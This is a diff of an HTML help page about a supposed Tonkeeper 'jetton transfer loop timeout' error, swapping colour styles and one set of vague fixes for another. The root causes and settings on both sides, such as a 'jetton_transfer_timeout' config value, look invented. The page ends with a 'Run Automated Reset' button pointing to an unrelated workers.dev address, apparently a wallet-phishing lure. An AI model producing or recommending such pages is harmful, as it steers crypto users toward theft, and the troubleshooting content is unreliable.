@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: sans-serif;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,31 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The Tonkeeper user interface displays a "Tonkeeper Jetton transfer loop timeout" error message, indicating that the jetton transfer process has exceeded the expected time limit.</li>
+<li>Users experience a "Tonkeeper Jetton transfer loop timeout" error when attempting to transfer jettons within the TON ecosystem, resulting in failed transactions and frustration.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a timeout in the Tonkeeper jetton transfer loop, which can be caused by network congestion, high gas fees, or issues with the Ton blockchain.</li>
+<li>The error occurs due to a misconfiguration in the Tonkeeper wallet settings, causing the transfer loop to exceed the maximum allowed timeout, leading to transaction failure.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the gas limit for the transaction to prioritize it in the network:</li>
-<li>Use the <code>--gas-limit</code> flag when sending transactions</li>
-<li>Adjust the <code>gasPrice</code> in the transaction settings</li>
-<li>Modify the transaction configuration using the following code block:</li>
+<li>Check the Tonkeeper wallet configuration to ensure the jetton transfer timeout is set to a reasonable value.</li>
+<li>Verify the TON blockchain network connectivity to rule out any issues with the underlying infrastructure.</li>
+<li>Update the Tonkeeper wallet software to the latest version to ensure compatibility with the TON ecosystem:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>-6<span class="w"> </span><span class="m">0</span>:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>JettonTransfer<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--gas-limit<span class="w"> </span><span class="m">200000</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--gas-price<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>--payload<span class="w"> </span><span class="s1">&#39;({&quot;dest&quot;:&quot;0:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;,&quot;value&quot;:100,&quot;payload&quot;:&quot;&quot;})&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;tonkeeper&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;jetton_transfer_timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">300</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for advanced troubleshooting and configuration. </p>
+<p>Consider utilizing an external console for advanced troubleshooting and configuration adjustments.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Tonos-cli installed and configured on the system</li>
-<li>A basic understanding of Ton blockchain and Tonkeeper</li>
-<li>Sufficient TON coins for gas fees</li>
+<li>Basic understanding of the TON ecosystem and its components</li>
+<li>Familiarity with the Tonkeeper wallet and its configuration options</li>
+<li>Access to the TON blockchain network and its associated tools</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
